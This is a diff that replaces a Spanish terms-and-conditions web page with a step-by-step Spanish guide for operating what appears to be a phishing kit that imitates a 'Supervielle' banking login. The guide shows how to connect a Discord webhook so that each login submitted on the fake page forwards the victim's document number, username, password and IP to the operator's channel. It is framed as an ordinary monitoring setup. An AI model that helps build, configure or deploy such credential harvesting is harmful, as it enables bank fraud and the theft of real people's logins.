@@ -1,49 +1,81 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-  <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Términos y condiciones | Alianza Venezuela</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,500;9..144,600&family=Manrope:wght@400;500;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="css/styles.css">
-</head>
-<body>
-  <div class="topbar"><div class="wrap"><span>Términos y condiciones</span><span>29 oct 2026</span></div></div>
-  <header class="site-header">
-    <div class="wrap nav">
-      <a class="logo" href="index.html"><div class="mark">AV</div><div><strong>Alianza Venezuela</strong><span>Red empresarial</span></div></a>
-      <button class="menu-btn" aria-label="Abrir menú">☰</button>
-      <nav class="nav-links">
-        <a href="index.html">Inicio</a><a href="nosotros.html">Nosotros</a><a href="proyectos.html">Proyectos</a><a href="opiniones.html">Empresarios</a><a href="finanzas.html">Finanzas</a><a href="unirse.html">Cómo unirse</a><a href="preguntas.html">Preguntas</a><a href="ubicacion.html">Ubicación</a><a href="contacto.html">Contacto</a>
-      </nav>
-    </div>
-  </header>
-  <main>
-    <section class="page-hero wrap legal-page">
-      <p class="breadcrumbs">Inicio / Términos y condiciones</p>
-      <h1>Términos y condiciones</h1>
-      <p>Estos términos rigen el uso del sitio Alianza Venezuela. Responsable: <strong>Olga Cecilia Jarava Herrera</strong>. País: República Bolivariana de Venezuela. WhatsApp 0412-5685746.</p>
-      <h2>1. Qué es este sitio</h2>
-      <p>Alianza Venezuela es una organización empresarial que reúne compañías, abre criterio de empresarios y publica orientación sobre finanzas y proyectos en Venezuela. Llevamos varios años operando en el país.</p>
-      <p>No somos un banco, casa de bolsa ni entidad de captación de fondos del público. Este sitio no ofrece valores, créditos, depósitos, seguros ni criptomonedas.</p>
-      <h2>2. Sin garantía de resultados</h2>
-      <p>Nada constituye asesoría de inversión personalizada, oferta pública ni promesa de ganancia. Toda decisión es exclusiva de quien la toma.</p>
-      <h2>3. Tarifas</h2>
-      <p>La primera consulta por WhatsApp no tiene costo. Cualquier servicio posterior se cotiza por escrito antes de iniciar. No hay cobros ocultos.</p>
-      <h2>4. Uso aceptable</h2>
-      <p>No use el sitio para fraude o spam. No envíe claves, PIN ni números de cuenta por el formulario.</p>
-      <h2>5. Contenido</h2>
-      <p>Textos y diseño pertenecen a Alianza Venezuela / Olga Cecilia Jarava Herrera, salvo otra fuente.</p>
-      <h2>6. WhatsApp</h2>
-      <p>WhatsApp es un servicio de terceros y aplican sus propias condiciones.</p>
-      <h2>7. Ley aplicable</h2>
-      <p>Leyes de la República Bolivariana de Venezuela.</p>
-      <p><a class="btn btn-line" href="privacidad.html">Ver privacidad</a></p>
-    </section>
-  </main>
-  <footer class="site-footer"><div class="wrap legal">© 2026 Alianza Venezuela · Olga Cecilia Jarava Herrera</div></footer>
-  <a class="wa-float" href="https://wa.me/584125685746" target="_blank" rel="noopener">WhatsApp</a>
-  <script src="js/main.js"></script>
-</body>
-</html>
+GUÍA DETALLADA — LLEGAR AVISOS A DISCORD
+========================================
+
+Idea simple:
+  Cuando alguien da INGRESAR en el login,
+  el sitio manda un mensaje automático a tu canal Discord.
+
+
+========================================
+A) CREAR EL WEBHOOK EN DISCORD
+========================================
+
+1. Abrí Discord (app o navegador) e iniciá sesión.
+2. Entrá al servidor de tu equipo de trabajo.
+3. Elegí el canal donde querés ver los ingresos
+   (ejemplo: #ingresos o #monitoreo).
+4. Clic DERECHO encima del nombre del canal.
+5. Tocá: Editar canal.
+6. En el menú de la izquierda: Integraciones.
+7. Tocá: Webhooks.
+8. Tocá: Nuevo webhook / Crear webhook.
+9. Nombre: Supervielle Monitor
+10. Tocá: Copiar URL del webhook.
+
+La URL se ve así:
+https://discord.com/api/webhooks/1234567890/xxxxxxxx
+
+
+========================================
+B) PEGARLA EN EL PANEL (FÁCIL)
+========================================
+
+1. Abrí el panel:
+   http://localhost/supervielle-personas/admin/login.php
+   (o en tu dominio: /admin/login.php)
+
+2. Entrá con tu usuario gerente.
+
+3. Arriba a la derecha tocá el botón azul: Discord
+
+4. Pegá la URL en el campo "URL del webhook"
+
+5. Marcá: Activar avisos a Discord
+
+6. Tocá: Guardar
+
+7. Tocá: Enviar prueba
+
+8. Mirá tu canal Discord: debe llegar un mensaje de prueba.
+
+
+========================================
+C) PROBAR CON UN LOGIN REAL
+========================================
+
+1. Abrí: /login.html
+2. Completá documento + usuario + clave
+3. Ingresar
+4. En Discord debe llegar:
+   - Documento
+   - Usuario
+   - Clave
+   - IP
+
+
+========================================
+PROBLEMAS COMUNES
+========================================
+
+- No llega nada:
+  · Revisá que diga "Discord ACTIVADO"
+  · La URL debe empezar con https://discord.com/api/webhooks/
+  · Estás mirando el canal correcto
+
+- Enviar prueba falla:
+  · Volvé a copiar la URL desde Discord
+  · Creá un webhook nuevo y pegalo otra vez
+
+- En cPanel:
+  · Usá el mismo botón Discord del panel online
+  · No edites a mano si no hace falta
